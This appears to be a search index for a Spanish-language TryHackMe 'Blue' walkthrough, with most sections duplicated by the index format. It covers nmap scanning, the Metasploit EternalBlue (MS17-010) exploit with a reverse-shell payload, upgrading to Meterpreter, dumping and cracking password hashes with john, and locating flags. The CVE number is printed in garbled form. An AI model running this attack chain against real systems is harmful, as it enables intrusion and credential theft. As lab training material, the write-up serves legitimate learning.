{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"BLUE MACHINE TRYHACKME Machine level : Easy OS : Windows x64 En esta ocasi\u00f3n estaremos explotando la m\u00e1quina BLUE de THM. Estaremos viendo como logramos ejecutar satisfactoriamente la vulnerabilidad conocida como Ethernalblue. Qu\u00e9 es Ethernalblue? EternalBlue aprovecha una vulnerabilidad en la implementaci\u00f3n del protocolo Server Message Block (SMB) de Microsoft. Esta vulnerabilidad, denotada como CVE-2017-01447\u200b8\u200b en el cat\u00e1logo Common Vulnerabilities and Exposures (CVE), se debe a que la versi\u00f3n 1 del servidor SMB (SMBv1) acepta en varias versiones de Microsoft Windows paquetes espec\u00edficos de atacantes remotos, permiti\u00e9ndoles ejecutar c\u00f3digo en el ordenador en cuesti\u00f3n.","title":"Home"},{"location":"#blue-machine-tryhackme","text":"Machine level : Easy OS : Windows x64 En esta ocasi\u00f3n estaremos explotando la m\u00e1quina BLUE de THM. Estaremos viendo como logramos ejecutar satisfactoriamente la vulnerabilidad conocida como Ethernalblue.","title":"BLUE MACHINE TRYHACKME"},{"location":"#que-es-ethernalblue","text":"EternalBlue aprovecha una vulnerabilidad en la implementaci\u00f3n del protocolo Server Message Block (SMB) de Microsoft. Esta vulnerabilidad, denotada como CVE-2017-01447\u200b8\u200b en el cat\u00e1logo Common Vulnerabilities and Exposures (CVE), se debe a que la versi\u00f3n 1 del servidor SMB (SMBv1) acepta en varias versiones de Microsoft Windows paquetes espec\u00edficos de atacantes remotos, permiti\u00e9ndoles ejecutar c\u00f3digo en el ordenador en cuesti\u00f3n.","title":"Qu\u00e9 es Ethernalblue?"},{"location":"cracking/","text":"What is the name of the non-default user? Esto es relativamente sencillo, ya que tenemos la secci\u00f3n meterpreter solo ejecutamos el comando hashdump , y obtendremos las password hasheadas de todos los users en el sistema. Obtenido esto sabemos que el non-default user es * Jon Respuesta: Jon What is the cracked password? Como ya tenemos el hash, lo que haremos es crackearlo con john, esto lo haremos de la siguiente manera. Copiamos la l\u00ednea completa del user Jon junto con su hash, y lo guardamos en un archivo de nombre cualquiera, en mi caso nombr\u00e9 el archivo como jon_hash. Ahora usaremos la herramienta john con la siguiente sintaxis. john jon_hash --format=NT --show Good As\u00ed obtenemos la password Respuesta : alqfna22","title":"Cracking"},{"location":"cracking/#what-is-the-name-of-the-non-default-user","text":"Esto es relativamente sencillo, ya que tenemos la secci\u00f3n meterpreter solo ejecutamos el comando hashdump , y obtendremos las password hasheadas de todos los users en el sistema. Obtenido esto sabemos que el non-default user es * Jon Respuesta: Jon","title":"What is the name of the non-default user?"},{"location":"cracking/#what-is-the-cracked-password","text":"Como ya tenemos el hash, lo que haremos es crackearlo con john, esto lo haremos de la siguiente manera. Copiamos la l\u00ednea completa del user Jon junto con su hash, y lo guardamos en un archivo de nombre cualquiera, en mi caso nombr\u00e9 el archivo como jon_hash. Ahora usaremos la herramienta john con la siguiente sintaxis. john jon_hash --format=NT --show Good As\u00ed obtenemos la password Respuesta : alqfna22","title":"What is the cracked password?"},{"location":"escalate/","text":"What is the name of the post module we will use? Para esto hacemos una b\u00fasqueda en google, tal como how to convert a shell to meterpreter shell in metasploit . El path resultante es el siguiente post/multi/manage/shell_to_meterpreter Select this (use MODULE_PATH). Show options, what option are we required to change? Esto es simple, si hacemos el show options veremos que el \u00fanico par\u00e1metro que tendremos que indicar es el n\u00famero de la secci\u00f3n que tenemos en backgraund, en nuestro caso la 1 Respuesta: SESSION Las dem\u00e1s preguntas de esta secci\u00f3n, solo es seguir leyendo ser\u00eda irrelevante, poner las preguntas restantes de esta secci\u00f3n.","title":"Escalate"},{"location":"escalate/#what-is-the-name-of-the-post-module-we-will-use","text":"Para esto hacemos una b\u00fasqueda en google, tal como how to convert a shell to meterpreter shell in metasploit . El path resultante es el siguiente post/multi/manage/shell_to_meterpreter","title":"What is the name of the post module we will use?"},{"location":"escalate/#select-this-use-module_path-show-options-what-option-are-we-required-to-change","text":"Esto es simple, si hacemos el show options veremos que el \u00fanico par\u00e1metro que tendremos que indicar es el n\u00famero de la secci\u00f3n que tenemos en backgraund, en nuestro caso la 1 Respuesta: SESSION Las dem\u00e1s preguntas de esta secci\u00f3n, solo es seguir leyendo ser\u00eda irrelevante, poner las preguntas restantes de esta secci\u00f3n.","title":"Select this (use MODULE_PATH). Show options, what option are we required to change?"},{"location":"find_flags/","text":"Flag1? This flag can be found at the system root. Como bien dice THM, se encuentra el en el system root de windows, por lo tanto en la ruta C:\\ , para dirigirnos a esa ruta escribimos lo siguiente. cd c:\\\\ Estando en el path, pondremos cat + flag + {press TAB} + {Press Enter}, esto har\u00e1 que se nos autocomplete y por lo tanto nos busca el file que estamos buscando, finalmente presionamos enter para el la flag. Flag2? This flag can be found at the location where passwords are stored within Windows Esto es f\u00e1cil la ruta es la siguiente %SystemRoot%/system32/config/ , si vamos all\u00e1 encontraremos la flag. Flag3? This flag can be found in an excellent location to loot. Lo primero que seg\u00fan las pistas, supongo que est\u00e1 dentro del user jon, as\u00ed que vamos all\u00e1. Ahora revisaremos dentro de Documents , para observar que se encuentra por ah\u00ed. Perfecto la tenemos.","title":"find_flags"},{"location":"find_flags/#flag1-this-flag-can-be-found-at-the-system-root","text":"Como bien dice THM, se encuentra el en el system root de windows, por lo tanto en la ruta C:\\ , para dirigirnos a esa ruta escribimos lo siguiente. cd c:\\\\ Estando en el path, pondremos cat + flag + {press TAB} + {Press Enter}, esto har\u00e1 que se nos autocomplete y por lo tanto nos busca el file que estamos buscando, finalmente presionamos enter para el la flag.","title":"Flag1? This flag can be found at the system root."},{"location":"find_flags/#flag2-this-flag-can-be-found-at-the-location-where-passwords-are-stored-within-windows","text":"Esto es f\u00e1cil la ruta es la siguiente %SystemRoot%/system32/config/ , si vamos all\u00e1 encontraremos la flag.","title":"Flag2? This flag can be found at the location where passwords are stored within Windows"},{"location":"find_flags/#flag3-this-flag-can-be-found-in-an-excellent-location-to-loot","text":"Lo primero que seg\u00fan las pistas, supongo que est\u00e1 dentro del user jon, as\u00ed que vamos all\u00e1. Ahora revisaremos dentro de Documents , para observar que se encuentra por ah\u00ed. Perfecto la tenemos.","title":"Flag3? This flag can be found in an excellent location to loot."},{"location":"gain_access/","text":"Metasploit En esta parte estaremos usando Mestasploit para acceder a la m\u00e1quina v\u00edctima por medio del ataque EthernalBlue. Lo primero que haremos es iniciar metasploit con el siguiente comando: msconsole -q Find the exploitation code we will run against the machine. What is the full path of the code? Ahora lo que haremos es muscar un exploit que nos sirva para explotar la vulnerabilidad Ethernablue. Simplemente realizaremos la siguiente b\u00fasqueda dentro de metasploit y veremos que sucede. search ms17_010 Efectivamente encontramos lo que estamos buscando, para seleccionarlo, por lo tanto la respuesta a la pregunta es ese full path. Para seleccionarlo usamos el comando use 0 Respuesta: exploit/windows/smb/ms17_010_eternalblue Show options and set the one required value. What is the name of this value? Si realizamos un show options , veremos las opciones que queremos configurar, en nuestro caso, solamente RHOST. Aunque la respuesta correcta sea RHOST, tambi\u00e9n tendremos que modificar nuestro LHOST debido a que estamos conectados por VPN. Importan Si no configuran el LHOST , el ataque no ser\u00e1 exitoso. Por lo general el payload se asigna autom\u00e1ticamente, pero para quitar las dudas lo asignaremos con el siguiente comando: set payload windows/x64/shell/reverse_tcp Hecho todo esto solo tendremos que escribir run y presionar ENTER y gual\u00e1 Reverse shell lograda !!!! Los otros apartados dentro de la secci\u00f3n no se tomar\u00e1n en cuenta, ya que soy muy f\u00e1ciles de hacer y no necesitan respuesta alguna.","title":"Gain Access"},{"location":"gain_access/#metasploit","text":"En esta parte estaremos usando Mestasploit para acceder a la m\u00e1quina v\u00edctima por medio del ataque EthernalBlue. Lo primero que haremos es iniciar metasploit con el siguiente comando: msconsole -q","title":"Metasploit"},{"location":"gain_access/#find-the-exploitation-code-we-will-run-against-the-machine-what-is-the-full-path-of-the-code","text":"Ahora lo que haremos es muscar un exploit que nos sirva para explotar la vulnerabilidad Ethernablue. Simplemente realizaremos la siguiente b\u00fasqueda dentro de metasploit y veremos que sucede. search ms17_010 Efectivamente encontramos lo que estamos buscando, para seleccionarlo, por lo tanto la respuesta a la pregunta es ese full path. Para seleccionarlo usamos el comando use 0 Respuesta: exploit/windows/smb/ms17_010_eternalblue","title":"Find the exploitation code we will run against the machine. What is the full path of the code?"},{"location":"gain_access/#show-options-and-set-the-one-required-value-what-is-the-name-of-this-value","text":"Si realizamos un show options , veremos las opciones que queremos configurar, en nuestro caso, solamente RHOST. Aunque la respuesta correcta sea RHOST, tambi\u00e9n tendremos que modificar nuestro LHOST debido a que estamos conectados por VPN. Importan Si no configuran el LHOST , el ataque no ser\u00e1 exitoso. Por lo general el payload se asigna autom\u00e1ticamente, pero para quitar las dudas lo asignaremos con el siguiente comando: set payload windows/x64/shell/reverse_tcp Hecho todo esto solo tendremos que escribir run y presionar ENTER y gual\u00e1 Reverse shell lograda !!!! Los otros apartados dentro de la secci\u00f3n no se tomar\u00e1n en cuenta, ya que soy muy f\u00e1ciles de hacer y no necesitan respuesta alguna.","title":"Show options and set the one required value. What is the name of this value?"},{"location":"recon/","text":"Scan the machine Para esto usaremos nmap con la siguiente systax nmap -sS --min-rate=5000 -Pn -n -vvv -p- 10.10.173.226 -oG allports How many ports are open with a port number under 1000? Si realizamos el scanning correctamente, veremos que se encuentran 3 puertos abiertos debajo de 1000 135/tcp 139/tcp 445/tcp What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067) Seg\u00fan el scanning podemos ver que se est\u00e1 utilizando SMBv1, y si lo relacionamos con el nombre de la m\u00e1quina esto nos huele a Ethernalblue, por lo tanto vamos a buscar la respuesta en el formato correspondiente de la pregunta. Ahora para encontrar el formato correspondiente a la pregunta me dirig\u00ed a google e realic\u00e9 la siguiente b\u00fasqueda. eternalblue metasploit De inmediato nos encontramos con esto. Respuesta: MS17-010","title":"Recon"},{"location":"recon/#scan-the-machine","text":"Para esto usaremos nmap con la siguiente systax nmap -sS --min-rate=5000 -Pn -n -vvv -p- 10.10.173.226 -oG allports","title":"Scan the machine"},{"location":"recon/#how-many-ports-are-open-with-a-port-number-under-1000","text":"Si realizamos el scanning correctamente, veremos que se encuentran 3 puertos abiertos debajo de 1000 135/tcp 139/tcp 445/tcp","title":"How many ports are open with a port number under 1000?"},{"location":"recon/#what-is-this-machine-vulnerable-to-answer-in-the-form-of-ms-ex-ms08-067","text":"Seg\u00fan el scanning podemos ver que se est\u00e1 utilizando SMBv1, y si lo relacionamos con el nombre de la m\u00e1quina esto nos huele a Ethernalblue, por lo tanto vamos a buscar la respuesta en el formato correspondiente de la pregunta. Ahora para encontrar el formato correspondiente a la pregunta me dirig\u00ed a google e realic\u00e9 la siguiente b\u00fasqueda. eternalblue metasploit De inmediato nos encontramos con esto. Respuesta: MS17-010","title":"What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)"}]}